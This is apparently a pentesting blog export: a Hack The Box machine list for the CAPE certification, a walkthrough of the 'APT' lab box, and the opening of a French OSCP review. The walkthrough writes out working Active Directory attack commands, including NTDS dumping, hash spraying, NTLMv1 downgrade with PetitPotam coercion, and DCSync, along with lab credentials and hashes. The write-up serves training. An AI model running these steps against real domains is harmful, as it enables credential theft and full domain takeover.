
[{"content":"","date":"26 December 2024","externalUrl":null,"permalink":"/","section":"Ani blog","summary":"","title":"Ani blog","type":"page"},{"content":"","date":"26 December 2024","externalUrl":null,"permalink":"/tags/certification/","section":"Tags","summary":"","title":"Certification","type":"tags"},{"content":"","date":"26 December 2024","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":" Introduction : # La certification CAPE (HTB Certified Active Directory Pentesting Expert) est une certification de la plateforme Hackthebox, d√©di√©e aux attaques sur l\u0026rsquo;environnement Active Directory. En plus du path de module ultra complet, cette liste de 40 machines me permettra de mettre en pratique les notions apprises lors des modules d‚Äôapprentissage.\nEasy : # Active https://app.hackthebox.com/machines/Active Forest https://app.hackthebox.com/machines/Forest Sauna https://app.hackthebox.com/machines/Sauna Heist https://app.hackthebox.com/machines/Heist SrvMon Return https://app.hackthebox.com/machines/Return Support https://app.hackthebox.com/machines/Support Timelapse https://app.hackthebox.com/machines/Timelapse Driver https://app.hackthebox.com/machines/Driver Bastion https://app.hackthebox.com/machines/Bastion Legacy https://app.hackthebox.com/machines/Legacy FriendZone https://app.hackthebox.com/machines/FriendZone Medium : # Outdated https://app.hackthebox.com/machines/Outdated Ypuffy https://app.hackthebox.com/machines/YPuffy Intelligence https://app.hackthebox.com/machines/Intelligence StreamIO https://app.hackthebox.com/machines/StreamIO Scrambled https://app.hackthebox.com/machines/Scrambled Escape https://app.hackthebox.com/machines/Escape Giddy https://app.hackthebox.com/machines/Giddy Querier https://app.hackthebox.com/machines/Querier Sniper https://app.hackthebox.com/machines/Sniper Authority https://app.hackthebox.com/machines/Authority Manager https://app.hackthebox.com/machines/Manager Resolute https://app.hackthebox.com/machines/Resolute Cascade https://app.hackthebox.com/machines/Cascade Montverde https://app.hackthebox.com/machines/Monteverde Certified https://app.hackthebox.com/machines/Certified Hard : # Object https://app.hackthebox.com/machines/Object Reel https://app.hackthebox.com/machines/Reel Blazorized https://app.hackthebox.com/machines/Blazorized Office https://app.hackthebox.com/machines/Office Breadcrumbs https://app.hackthebox.com/machines/Breadcrumbs Mantis https://app.hackthebox.com/machines/Mantis Tally https://app.hackthebox.com/machines/Tally Freelancer https://app.hackthebox.com/machines/Freelancer Insane : # Absolute https://app.hackthebox.com/machines/Absolute Rebound https://app.hackthebox.com/machines/Rebound Anubis https://app.hackthebox.com/machines/Anubis Ethereal https://app.hackthebox.com/machines/Ethereal Fighter https://app.hackthebox.com/machines/Fighter Sizzle https://app.hackthebox.com/machines/Sizzle APT https://app.hackthebox.com/machines/APT ","date":"26 December 2024","externalUrl":null,"permalink":"/posts/box-cape/","section":"Posts","summary":"","title":"HTB CAPE - Machines liste","type":"posts"},{"content":"","date":"26 December 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"26 December 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Recon and scanning : # Small nmap scan to scan the most common ports.\n\u0026gt; nmap -sV -sC -Pn 10.10.10.213 -T4 PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Ok port 80 and RPC, let‚Äôs try to list all the open ports.\n\u0026gt; nmap -p- -n -Pn --max-retries 1 10.10.10.213 -T5 PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc Nothing more it would seem that web enumeration is my next steps. but before small UDP scan\n\u0026gt; nmap -n -Pn --max-retries 1 10.10.10.213 -T5 -sU NO OPEN PORTS Enumerate IIS : # We are forced to list the IIS web service then allon y. I scan directories with gobuster and add asp and aspx extensions because it is the framwork of dev commonly used in windows environment\n\u0026gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.213 -x asp,aspx,php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.213 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.213/Images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.213/css/] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.213/fonts/] /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.213/images/] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.213/js/] A little whatweb to see the technos used by the web service and also other cool infos.\n\u0026gt; whatweb -a 3 http://10.10.10.213 http://10.10.10.213 [200 OK] Bootstrap[3.1.1], Country[RESERVED][ZZ], Email[sales@gigantichosting.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.213], JQuery, Microsoft-IIS[10.0], Script[application/x-javascript,text/javascript], Title[Gigantic Hosting | Home] It is meager in info, but we still recover a potential username.\nsales I‚Äôm going to look at the website on the IIS and it seems that the site is just static html/css without functionality.\nWell there is shit, I see nothing that will allow me to advance my exploitation of the machine.\nIPV6 for the win : # However, it has an open port 135, which hosts the RPC service. A Remote Procedure Call (RPC) is a type of interprocess communication (IPC) that allows a client to invoke procedures exposed by an RPC server. The client calls the function as if it were a standard local procedure call.\nNow, how can this service be leveraged for advanced operations? RPC may have misconfigurations, such as a Null-Bind, similar to what can occur with LDAP or SMB.\nLets try this.\n\u0026gt; rpcclient -U \u0026#39;\u0026#39; -N \u0026#34;10.10.10.213\u0026#34; -d Cannot connect to server. Error was NT_STATUS_IO_TIMEOUT Well it‚Äôs not working for the Null bind.\nWhile searching for RPC enumeration methods I came across that blog.\nhttps://juggernaut-sec.com/ad-recon-msrpc/#Mapping_RPC_Endpoints_‚Äì_rpcmappy\nAs in the article we can list endpoitn mapping with rpcmap.py\n\u0026gt; rpcmap.py \u0026#39;ncacn_ip_tcp:10.10.10.213\u0026#39; In this dump, we can note the presence of a very interesting endpoint, like the UID {99FCFEC4-5260-101B-BBCB-00AA0021347A} which corresponds to the IID_IObjectExporter service. As we can see in this microsoft doc\nThe IObjectExporter interface is used for OXID resolution. Leveraging this, it is possible to perform a clever technique that involves extracting the host\u0026rsquo;s network interfaces through this service without authentication.\nIf an IPv6 address is discovered, it can be utilized to identify additional services on the host, potentially expanding the attack surface.\nThere is a script created by the airbus team to do this tricks, the script is called IOXIDResolver.py.\n\u0026gt; python IOXIDResolver-ng.py -t 10.10.10.213 |==========================| | IOXIDResolver Next Gen | |==========================| [.] Anonymous connection on MSRPC [+] Retriev Network Interfaces for 10.10.10.213... [+] ServerAlive2 methode return 5 interface(s) [+] aNetworkAddr addresse : apt (Hostname) [+] aNetworkAddr addresse : 10.10.10.213 (IPv4) [+] aNetworkAddr addresse : dead:beef::b168:1943:6343:cf8e (IPv6) [+] aNetworkAddr addresse : dead:beef::b885:d62a:d679:573f (IPv6) [+] aNetworkAddr addresse : dead:beef::90 (IPv6) Well I managed to list the new interfaces and I find an IPv6 for the target server, let‚Äôs see if there is a new service hiding in it.\nTry to ping ipv6 address.\n\u0026gt; ping dead:beef::b885:d62a:d679:573f -c 1 PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes 64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=24.4 ms --- dead:beef::b885:d62a:d679:573f ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 24.381/24.381/24.381/0.000 ms the ping work, lets run nmap scan.\n\u0026gt; nmap -sV -Pn -T4 -6 dead:beef::b885:d62a:d679:573f Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-15 09:48 EST Nmap scan report for dead:beef::b885:d62a:d679:573f Host is up (0.022s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-15 14:48:19Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) In addition i can add this IPv6 on my /etc/hosts like that.\necho \u0026#34;dead:beef::b885:d62a:d679:573f htb6.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerate Domain Controleur - SMB : # We have access to all the services of a domain controller, in general I start by enumerating SMB because it is the service that can give the most information, and bad config are frequent.\nI try to enumerate SMB share with nxc.\n\u0026gt; nxc smb dead:beef::b885:d62a:d679:573f -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB dead:beef::b885:d62a:d679:573f 445 APT [+] htb.local\\: SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Enumerated shares SMB dead:beef::b885:d62a:d679:573f 445 APT Share Permissions Remark SMB dead:beef::b885:d62a:d679:573f 445 APT ----- ----------- ------ SMB dead:beef::b885:d62a:d679:573f 445 APT backup READ SMB dead:beef::b885:d62a:d679:573f 445 APT IPC$ Remote IPC SMB dead:beef::b885:d62a:d679:573f 445 APT NETLOGON Logon server share SMB dead:beef::b885:d62a:d679:573f 445 APT SYSVOL Logon server share At this point, it becomes evident that not all Active Directory pentesting tools support IPv6. To address this, a method is required to redirect the IPv6 traffic to IPv4. This can be achieved using Socat. By performing local port forwarding from a port on the localhost, it is possible to redirect all traffic to the victim\u0026rsquo;s IPv6 address.\n\u0026gt; socat TCP-LISTEN:445,reuseaddr,fork TCP6:[dead:beef::b885:d62a:d679:573f]:445 Lets connect on backup share with smbclient.\n\u0026gt; smbclient --no-pass //localhost/backup smb: \\\u0026gt; ls . D 0 Thu Sep 24 03:30:52 2020 .. D 0 Thu Sep 24 03:30:52 2020 backup.zip A 10650961 Thu Sep 24 03:30:32 2020 5114623 blocks of size 4096. 2634584 blocks available smb: \\\u0026gt; get backup.zip getting file \\backup.zip of size 10650961 as backup.zip (6616.6 KiloBytes/sec) (average 6616.6 KiloBytes/sec) The zip seems to be password protected. thanks to a john the ripper module I can extract the password hash from the archive and break it locally.\n\u0026gt; zip2john backup.zip \u0026gt; ziphash.txt \u0026gt; john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status iloveyousomuch (backup.zip) 1g 0:00:00:00 DONE (2024-12-17 03:45) 16.66g/s 204800p/s 204800c/s 204800C/s horoscope..hawkeye Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. By unzipping the archive, I discover a backup of the NTDS database. This database contains all the secrets of every user in the domain. These secrets can be extracted using Secretdump.\n\u0026gt; secretsdump -ntds Active\\ Directory/ntds.dit -security registry/SECURITY -system registry/SYSTEM LOCAL After dumping the database, I obtain a large number of hashes. To verify their validity, I test a random hash against the htb.local domain.\njulee.curry:3214:aad3b435b51404eeaad3b435b51404ee:5feeeb99edfa4c0e1a3674459321b143::: nxc smb localhost -u \u0026#39;julee.curry\u0026#39; -H 5feeeb99edfa4c0e1a3674459321b143 SMB 127.0.0.1 445 APT [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB 127.0.0.1 445 APT [-] htb.local\\julee.curry:5feeeb99edfa4c0e1a3674459321b143 STATUS_LOGON_FAILURE Find valid credential : # The hash does not appear to be valid, so sorting will be necessary. First, I will filter the users in the database to include only those that are valid on the domain.\nAfter selecting only the NTLM hash portion of the dump (manually, using gedit üòÖ), the resulting file looks like this:\nusing the following command I can only sort users.\n\u0026gt; cut -d : -f 1 user.txt \u0026gt; justuser.txt To list valid users, it is possible to exploit a Kerberos concept, specifically the KRB_AS_REQ process, also known as pre-authentication. This step involves sending a Ticket Granting Ticket (TGT) request to the Key Distribution Center (KDC) on the domain controller (DC). The DC then responds with either a TGT or an error.\nThis error can be used to determine whether a user exists. For this task, the kerbrute script is an excellent tool.\nPS: don‚Äôt forget to change the port on your socat tunnel.\n\u0026gt; kerbrute userenum --domain \u0026#34;htb.local\u0026#34; justuser.txt --dc localhost __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 12/17/24 - Ronnie Flathers @ropnop 2024/12/17 04:18:24 \u0026gt; Using KDC(s): 2024/12/17 04:18:24 \u0026gt; localhost:88 2024/12/17 04:18:24 \u0026gt; [+] VALID USERNAME: Administrator@htb.local 2024/12/17 04:18:24 \u0026gt; [+] VALID USERNAME: APT$@htb.local 2024/12/17 04:18:26 \u0026gt; [+] VALID USERNAME: henry.vinson@htb.local Now that a valid user has been identified, the next step is to test the NT hash found in the NTDS database.\nwith the following command I can only output the NT hash.\n\u0026gt; cat user.txt |cut -d : -f 4 | uniq \u0026gt; NThash.txt With this hash list I can do password spraying on the user henry.vinson, with netexec for example.\n\u0026gt; nxc smb dead:beef::b885:d62a:d679:573f -u \u0026#39;henry.vinson\u0026#39; -H NThash.txt # GET BAN BY FAIL2BAN Service SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. SMB dead:beef::b885:d62a:d679:573f 445 APT [-] Connection Error: The NETBIOS connection with the remote host timed out. Well it would seem that there is a fail2ban install to avoid this kind of attack, but is it also active on kerberos ? So we can try to do the same attack but on kerberos.\nI write a little python script to do this because nothing did what I wanted https://github.com/Anh4ckin3/pschitkerberos/\npython /home/kali/Documents/pschitkerberos/pschitkerberos.py -domain htb.local -dc 127.0.0.1 -username \u0026#34;henry.vinson\u0026#34; -hashfile /root/HTB/NThash.txt ____ _ _ _ _ __ _ | _ \\ ___ ___| |__ (_) |_| |/ /___ _ __| |__ ___ _ __ ___ ___ | |_) / __|/ __| \u0026#39;_ \\| | __| \u0026#39; // _ \\ \u0026#39;__| \u0026#39;_ \\ / _ \\ \u0026#39;__/ _ \\/ __| | __/\\__ \\ (__| | | | | |_| . \\ __/ | | |_) | __/ | | (_) \\__ \\ |_| |___/\\___|_| |_|_|\\__|_|\\_\\___|_| |_.__/ \\___|_| \\___/|___/ [+] Testing multiple hashes from file: /root/HTB/NThash.txt against domain: htb.local [+] henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb is valid creds Domain enumeration and registry : # A valid identifier has been obtained for authentication on the domain. Using an nxc module, additional information about the user henry.vinson can be retrieved.\n\u0026gt; nxc ldap dead:beef::b885:d62a:d679:573f -u \u0026#39;henry.vinson\u0026#39; -H e53d87d42adaa3ca32bdb34a876cbffb -M whoami SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) LDAP dead:beef::b885:d62a:d679:573f 389 APT [+] htb.local\\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb WHOAMI dead:beef::b885:d62a:d679:573f 389 APT distinguishedName: CN=henry.vinson,CN=Users,DC=htb,DC=local WHOAMI dead:beef::b885:d62a:d679:573f 389 APT name: henry.vinson WHOAMI dead:beef::b885:d62a:d679:573f 389 APT Enabled: Yes WHOAMI dead:beef::b885:d62a:d679:573f 389 APT Password Never Expires: Yes WHOAMI dead:beef::b885:d62a:d679:573f 389 APT Last logon: 133789858480603714 WHOAMI dead:beef::b885:d62a:d679:573f 389 APT pwdLastSet: 132454057850496940 WHOAMI dead:beef::b885:d62a:d679:573f 389 APT logonCount: 34 WHOAMI dead:beef::b885:d62a:d679:573f 389 APT sAMAccountName: henry.vinson There is a second user in the domain, it‚Äôs henry.vinson_adm, with netexec I can do an ldap query to find more info related to this object.\n\u0026gt; nxc ldap dead:beef::b885:d62a:d679:573f -u \u0026#39;henry.vinson\u0026#39; -H e53d87d42adaa3ca32bdb34a876cbffb --query \u0026#34;(sAMAccountName=henry.vinson_adm)\u0026#34; \u0026#34;\u0026#34; It is part of the Remote Management Users group, which means that if I can compromise this user I can open a shell on the DC with winrm.\nDump domain info.\n\u0026gt; socat TCP-LISTEN:389,reuseaddr,fork TCP6:[dead:beef::b885:d62a:d679:573f]:389 \u0026gt; ldapdomaindump --user \u0026#34;htb.local\u0026#34;\\\\\u0026#34;henry.vinson\u0026#34; --password \u0026#34;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb\u0026#34; --outdir ldapdomaindump \u0026#34;localhost\u0026#34; [*] Connecting to host... [*] Binding to host [+] Bind OK [*] Starting domain dump [+] Domain dump finished I‚Äôm looking for an ACL or password that will allow further progression. I am focusing on the Windows registry, as it often contains crucial information. The Windows registry is still quite accessible, meaning we can easily access keys that should normally be more restricted. I use this method to enumerate Windows registry keys.\nhttps://juggernaut-sec.com/password-hunting/#Password_Hunting_%E2%80%93_Registry_Keys\nit has a tool of the impacket lib to remotly list the windows registry.\n# HKLM REGISTRY HIVE \u0026gt; reg.py -debug -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb6.local query -keyName \u0026#34;HKLM\u0026#34; [-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied # HKCU REGISTRY HIVE \u0026gt; reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb6.local query -keyName \u0026#34;HKCU\u0026#34; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [!] Cannot check RemoteRegistry status. Triggering start trough named pipe... HKCU HKCU\\Console HKCU\\Control Panel HKCU\\Environment HKCU\\Keyboard Layout HKCU\\Network HKCU\\Software HKCU\\System HKCU\\Volatile Environment I can access the HKCU hive. Let\u0026rsquo;s see what interesting information we can find there. After enumerating the keys, I come across an unusual key in HKCU\\Software.\n\u0026gt; reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb6.local query -keyName \u0026#34;HKCU\\Software\u0026#34; -s Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [!] Cannot check RemoteRegistry status. Triggering start trough named pipe... Software\\GiganticHostingManagementSystem\\ UserName REG_SZ henry.vinson_adm PassWord REG_SZ G1#Ny5@2dvht Let‚Äôs try to validate this credential.\n\u0026gt; nxc winrm dead:beef::b885:d62a:d679:573f -u \u0026#39;henry.vinson_adm\u0026#39; -p \u0026#39;G1#Ny5@2dvht\u0026#39; WINRM dead:beef::b885:d62a:d679:573f 5985 APT [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local) WINRM dead:beef::b885:d62a:d679:573f 5985 APT [+] htb.local\\henry.vinson_adm:G1#Ny5@2dvht (admin) Open a shell with evil-winrm.\n\u0026gt; evil-winrm -u \u0026#34;henry.vinson_adm\u0026#34; -p \u0026#34;G1#Ny5@2dvht\u0026#34; -i \u0026#34;htb6.local\u0026#34; Enumerate host : # So windows defenders is active on the hosts so i use the obfuscated version of winpeas.\n\u0026gt; wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe I run winpeas binary and i find realy interresting information.\nNTLMv1 is alive !\nExploit NTLMv1 : # The Domain Controller supports NTLMv1, which is surprising to some. NTLMv1 uses outdated cryptographic methods, making it vulnerable. It is possible to downgrade to NTLMv1, disable SSP, and crack the hash using a site like cracks.sh. Additionally, session relaying on services like LDAP can be done to perform RBCD, though this scenario is not applicable on this box.\nI first, edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge, that will disable protection like ESS/SSP.\nHTTPS = On DNS = On LDAP = On ... ; Custom challenge. ; Use \u0026#34;Random\u0026#34; for generating a random challenge for each requests (Default) Challenge = 1122334455667788 start Responder with --lm for be downgraded.\n\u0026gt; Responder.py -I tun0 --lm Now, run coercion with Petitpotam.\n\u0026gt; petitpotam.py -d \u0026#34;htb.local\u0026#34; -u \u0026#34;henry.vinson_adm\u0026#34; -p \u0026#39;G1#Ny5@2dvht\u0026#39; \u0026#34;10.10.14.11\u0026#34; \u0026#34;htb6.local\u0026#34; ___ _ _ _ ___ _ | _ \\ ___ | |_ (_) | |_ | _ \\ ___ | |_ __ _ _ __ | _/ / -_) | _| | | | _| | _/ / _ \\ | _| / _` | | \u0026#39; \\ _|_|_ \\___| _\\__| _|_|_ _\\__| _|_|_ \\___/ _\\__| \\__,_| |_|_|_| _| \u0026#34;\u0026#34;\u0026#34; |_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_| \u0026#34;\u0026#34;\u0026#34; |_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|_|\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;| \u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39;\u0026#34;`-0-0-\u0026#39; PoC to elicit machine account authentication via some MS-EFSRPC functions by topotam (@topotam77) Inspired by @tifkin_ \u0026amp; @elad_shamir previous work on MS-RPRN Trying pipe lsarpc [-] Connecting to ncacn_np:htb6.local[\\PIPE\\lsarpc] [+] Connected! [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e [+] Successfully bound! [-] Sending EfsRpcOpenFileRaw! [+] Got expected ERROR_BAD_NETPATH exception!! [+] Attack worked! We receive the NTLMv1 hash (Without SSP).\nTo give the hash to cracks.sh we need to give it the NT-LM response in a specific format like this.\nNTHASH:\u0026lt;RESPONSE\u0026gt; The values we need are present in the hash NTLMv1\nNow we can go on cracks.sh and uplaod the hash on submission page.\nYou have to enter an email to receive the result. Once the NT hash has been found, you will receive an email with it.\nNT hash: d167c3238864b12f5f82feae86a7f798 So we have the NT hash of the domain controller. which means that it is possible to make a DCSync because the DC‚Äôs are allowed to perform replications. Thanks to DCSync we can recover the NT hash from the domain administrator\n\u0026gt; secretsdump htb.local/\u0026#39;apt$\u0026#39;@htb6.local -hashes :d167c3238864b12f5f82feae86a7f798 -just-dc-user administrator Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3 Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413 Administrator:des-cbc-md5:0816d9d052239b8a [*] Cleaning up... To get the flag use evil-winrm because windefender block some operation.\nThe machine was cool because it allowed me to develop some script, but the end is a little irrealist I do not understand that we can not make relay, that would have been so cool.\n","date":"19 December 2024","externalUrl":null,"permalink":"/posts/apt/","section":"Posts","summary":"","title":"HTB APT - Insane","type":"posts"},{"content":"","date":"19 December 2024","externalUrl":null,"permalink":"/tags/kerberos/","section":"Tags","summary":"","title":"Kerberos","type":"tags"},{"content":"","date":"19 December 2024","externalUrl":null,"permalink":"/tags/ntlmv1/","section":"Tags","summary":"","title":"NTLMv1","type":"tags"},{"content":"","date":"19 December 2024","externalUrl":null,"permalink":"/tags/scripting/","section":"Tags","summary":"","title":"Scripting","type":"tags"},{"content":"","date":"19 December 2024","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"12 November 2024","externalUrl":null,"permalink":"/tags/oscp/","section":"Tags","summary":"","title":"OSCP","type":"tags"},{"content":"","date":"12 November 2024","externalUrl":null,"permalink":"/tags/review/","section":"Tags","summary":"","title":"Review","type":"tags"},{"content":" Ma situation avant/pendant OSCP : # Parlons un peu de moi : je suis en derni√®re ann√©e de mon BTS SIO et je me dis que passer l‚ÄôOSCP serait cool pour trouver une alternance (mdrr t\u0026rsquo;inqui√®te) dans un m√©tier de la cybers√©curit√©. Niveau bagage technique, j‚Äôai pass√© une certification avec une condition d‚Äôexamen, √† savoir l‚ÄôEJPTv2. J‚Äôai aussi fait pas mal de HTB, des pro labs (Dante et Zephyr) qui m‚Äôont vraiment aid√© √† prendre confiance en mes comp√©tences techniques, ainsi que du Root-Me pour la partie vuln√©rabilit√©s web. On est donc en mai 2024, je prends mon bundle OSCP √† 1600 balles (ouille, le coup de batte de baseball au porte-monnaie), et c‚Äôest parti.\nPetite roadmap de mon parcours OSCP.\nRoadmaps\nM√©thode d‚Äôapproche : # Avant le cours OSCP :\nJe voulais monter en comp√©tences sur divers aspects, notamment l‚Äôaspect tryharder, donc j‚Äôai r√©alis√© la TJ Null List en me for√ßant √† ne regarder les r√©ponses que si je bloquais depuis trop longtemps. J‚Äôai envie de dire que l‚ÄôOSCP est vraiment une certification qui m‚Äôa surpris, alors je pense que le meilleur moyen de se pr√©parer √† l‚ÄôOSCP, c‚Äôest de faire l‚ÄôOSCP (cours, lab, exam). La phase avant OSCP est finalement juste une √©tape pour se rassurer techniquement, selon moi.\nPendant l\u0026rsquo;OSCP :\nJ‚Äôai eu un rythme de travail personnel de 15 heures par semaine minimum pendant 3 mois pour faire les cours et les labs de l‚ÄôOSCP (en plus du taf quotidien). Je conseille vraiment d‚Äôaller chercher les 10 points bonus, pur√©e, ils m‚Äôont bien sauv√© la mise ! La partie la plus relou pour moi a √©t√© les cours, car j‚Äôavais d√©j√† les notions abord√©es par la certification, mais le fait d‚Äô√™tre forc√© de faire les cours (pour les points bonus) a √©t√© une bonne chose, car j‚Äôai pu perfectionner mes connaissances dans tous les aspects abord√©s par l‚ÄôOSCP. Pour √©viter que l‚ÄôOSCP me lasse ‚Äî du moins la partie cours ‚Äî, je faisais en m√™me temps des Practice Labs (Medtech, Relia, OSCP-Like), ce qui me permettait de ne pas m‚Äôennuyer et de rester stimul√© pendant 3 mois. √Ä la fin des trois mois, j‚Äôavais fini les cours et les labs, et j‚Äôavais mes points. D‚Äôailleurs, je vous conseille d‚Äôenvoyer un mail √† Offsec pour confirmer que vous avez bien les points.\nRetour sur les cours OSCP : # Les cours en soi sont de plut√¥t bonne qualit√© ; j‚Äôai √©t√© surpris par la profondeur de certains modules (c‚Äô√©tait s√ªrement mon niveau technique qui √©tait ras des p√¢querettes), notamment les cours sur les SQLi, le pivoting/port forwarding, et l‚Äô√©l√©vation de privil√®ges sous Windows. La partie Active Directory est aussi bien ficel√©e et aborde des notions de base tout en allant parfois en profondeur, notamment sur la partie √©num√©ration o√π l‚Äôon apprend √† √©num√©rer l‚ÄôAD √† la main avec PowerShell et LDAP. En revanche, parfois l‚ÄôOSCP pr√©sente des m√©thodes vraiment legacy, alors qu‚Äôil existe des m√©thodes plus r√©centes et, selon moi, plus efficaces.\nPetit point n√©gatif sur le cours d‚Äôintroduction √† l‚Äô√©vasion d‚Äôantivirus, qui est vraiment legacy pour le coup. L‚Äôexplication du fonctionnement d‚Äôun AV est assez compl√®te, mais les techniques abord√©es sont vraiment maigres et ne fonctionnent √† aucun moment dans un 